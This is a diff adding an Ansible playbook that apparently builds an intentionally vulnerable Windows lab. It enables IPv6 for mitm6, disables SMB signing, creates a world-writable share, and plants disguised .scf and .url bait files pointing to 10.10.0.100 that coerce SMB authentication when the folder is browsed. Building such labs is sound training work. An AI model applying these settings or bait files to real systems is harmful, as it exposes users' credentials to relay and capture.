@@ -1,0 +1,98 @@
+---
+# ==============================================================================
+# vuln_lateral/tasks/smb.yml
+# Targets: file01.corp.local, ws01.corp.local
+#
+# LAT-028  SMB signing disabled on non-DC members (relay precondition)
+# LAT-027  IPv6 enabled on ws01 (mitm6 WPAD/DHCPv6 relay surface)
+# LAT-033  Writable share on file01 with .scf / .url coercion bait files
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# LAT-027: IPv6 stack enabled on ws01
+# Clear the DisabledComponents bitmask so IPv6 is fully active.
+# Only apply on ws01; IPv6 should remain enabled everywhere, but it's most
+# important here for mitm6 targeting.
+# ------------------------------------------------------------------------------
+- name: LAT-027 - Ensure IPv6 DisabledComponents is 0 on ws01 (mitm6 surface)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters'
+    name: DisabledComponents
+    data: 0
+    type: dword
+  when: inventory_hostname == 'ws01.corp.local'
+
+# ------------------------------------------------------------------------------
+# LAT-028: SMB signing disabled on workstation and file server.
+# DCs enforce signing by default and must not be touched.
+# ------------------------------------------------------------------------------
+- name: LAT-028 - Disable SMB server-side signing requirement
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+    name: "{{ item.name }}"
+    data: 0
+    type: dword
+  loop:
+    - { name: RequireSecuritySignature }
+    - { name: EnableSecuritySignature }
+
+- name: LAT-028 - Disable SMB client-side signing requirement
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'
+    name: RequireSecuritySignature
+    data: 0
+    type: dword
+
+# ------------------------------------------------------------------------------
+# LAT-033: Writable share on file01 with coercion bait files
+# The share directory is world-writable so an attacker can drop payloads.
+# The pre-staged .scf and .url files coerce SMB auth when a user browses.
+# Only applies to file01.
+# ------------------------------------------------------------------------------
+- name: LAT-033 - Create C:\Shared directory
+  ansible.windows.win_file:
+    path: 'C:\Shared'
+    state: directory
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: LAT-033 - Share C:\Shared as PublicShare (writable by Everyone)
+  ansible.windows.win_shell: |
+    $share = Get-SmbShare -Name "PublicShare" -ErrorAction SilentlyContinue
+    if (-not $share) {
+      New-SmbShare -Name "PublicShare" -Path "C:\Shared" `
+        -FullAccess "Everyone" -ErrorAction Stop
+      Write-Output "changed: share created"
+    } else {
+      Write-Output "ok: share already exists"
+    }
+  register: result_share
+  changed_when: "'changed:' in result_share.stdout"
+  failed_when: result_share.rc != 0
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: LAT-033 - Set NTFS full-control for Authenticated Users on C:\Shared
+  ansible.windows.win_shell: |
+    icacls "C:\Shared" /grant "BUILTIN\Users:(OI)(CI)M" 2>$null | Out-Null
+  when: inventory_hostname == 'file01.corp.local'
+  changed_when: false
+
+- name: LAT-033 - Drop .scf coercion bait (triggers SMB auth on browse)
+  ansible.windows.win_copy:
+    dest: 'C:\Shared\HR-Documents.scf'
+    content: |
+      [Shell]
+      Command=2
+      IconFile=\\10.10.0.100\share\icon.ico
+      [Taskbar]
+      Command=ToggleDesktop
+  when: inventory_hostname == 'file01.corp.local'
+
+- name: LAT-033 - Drop .url coercion bait (triggers SMB auth on browse)
+  ansible.windows.win_copy:
+    dest: 'C:\Shared\Quarterly-Report.url'
+    content: |
+      [InternetShortcut]
+      URL=file://10.10.0.100/share/index.html
+      IconFile=\\10.10.0.100\share\icon.ico
+      IconIndex=0
+  when: inventory_hostname == 'file01.corp.local'
